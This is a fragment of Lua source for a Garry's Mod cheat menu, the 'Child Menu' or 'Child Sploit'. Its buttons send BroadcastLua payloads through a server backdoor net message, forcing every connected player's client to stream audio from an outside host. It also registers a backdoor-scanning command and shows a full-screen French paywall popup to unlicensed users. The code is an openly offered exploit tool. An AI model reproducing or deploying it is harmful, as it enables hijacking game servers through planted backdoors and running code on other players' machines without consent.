net.WriteString("BroadcastLua([[sound.PlayURL( \"http://Jesuschristoff.livehost.fr/gmod/upload/tk78/musique%201.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Child Menu", "] ", Color( 255, 255, 255 ), "Soundboard" )
    SploitNotify("Soundboard")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Targets)
Macro:SetPos( 260, 180 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Soundboard - musique 2" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        surface.SetDrawColor( Color(math.random(0,230),
                      math.random(0,210),
                      math.random(0,210),
                                   210))
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://Jesuschristoff.livehost.fr/gmod/upload/tk78/musique%202.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Child Menu", "] ", Color( 255, 255, 255 ), "Soundboard" )
    SploitNotify("Soundboard")
    surface.PlaySound("buttons/blip1.wav") 
end




------------------------------
--     OPEN Child MENU      --
------------------------------
surface.PlaySound("buttons/blip1.wav")
SploitNotify("Bienvenue sur le Child Menu " .. ply:GetName())

---------------------------------
end
concommand.Add("ChildDevs", Child)
concommand.Add("Child_scanbd", checkbackdoors)
----------------------------------

else -- if steamid isn't authorized

surface.CreateFont( "PopupHFont", {
    font = "Segoe UI Light",
    size = 50,
    weight = 1000,
})

surface.CreateFont("PopupFont", {
    font = "Segoe UI Light",
    size = 21,
    weight = 300
})

concommand.Add("fucked", function()
    local Popup = vgui.Create("DFrame")
        Popup:SetSize( ScrW(), ScrH() )
        Popup:SetPos( 0,0 )
        Popup:SetVisible( true )
        Popup:SetDraggable( false )
        Popup:SetTitle( "" )
        Popup:MakePopup()
        Popup:ShowCloseButton( false )
        Popup.Paint = function(s,w,h) 
        surface.SetDrawColor( Color(0,0,0,200) ) 
        surface.DrawRect( 0,0, w,h ) 
        surface.SetDrawColor( Color(240,0,0) )
        surface.DrawRect( 0, w/2-Popup:GetTall()/1.520, ScrW(), ScrH()/6.5 )
        surface.SetTextColor(255,255,255) 
        surface.SetTextPos(w/5.10, h/2.40)
            surface.SetFont("PopupHFont")
            surface.SetTextPos(w/5.10, h/3)
            surface.DrawText("Erreur")
            surface.SetFont("PopupFont") 
            surface.SetTextPos(w/5.10, h/2.50)
            surface.DrawText( "Tu n'as pas acheté le Child Sploit," )
            surface.SetTextPos(w/5.10, h/2.40)              
            surface.DrawText( "donc tu ne peux pas l'utiliser." )
            surface.SetTextPos(w/5.10, h/2.30)
            surface.DrawText("Merci de contacter Child Exploit si l'erreur persiste.")
    end 
    button = vgui.Create("DButton", Popup)
    button:SetSize(160,60.5)
    button:SetPos(Popup:GetWide()/2+Popup:GetWide()/10, Popup:GetTall()/2.050)
    button:SetText("")
    button.Paint = function(s,w,h) 
        surface.SetDrawColor( Color(255,255,255) ) 
        surface.DrawRect( 0,0, w,h ) 
        surface.SetDrawColor( Color(80,180,240) ) 
        surface.DrawRect( 0+3,0+3, w-6,h-6 ) 
        surface.SetTextColor(255,255,255) 
        surface.SetFont("PopupFont") 
        surface.SetTextPos(24,5.5) 
        surface.DrawText( "Continue" ) 
    end 
    button.DoClick = function(s,w,h) 
        Popup:Close()
    end
	
end) 
RunConsoleCommand("fucked")
end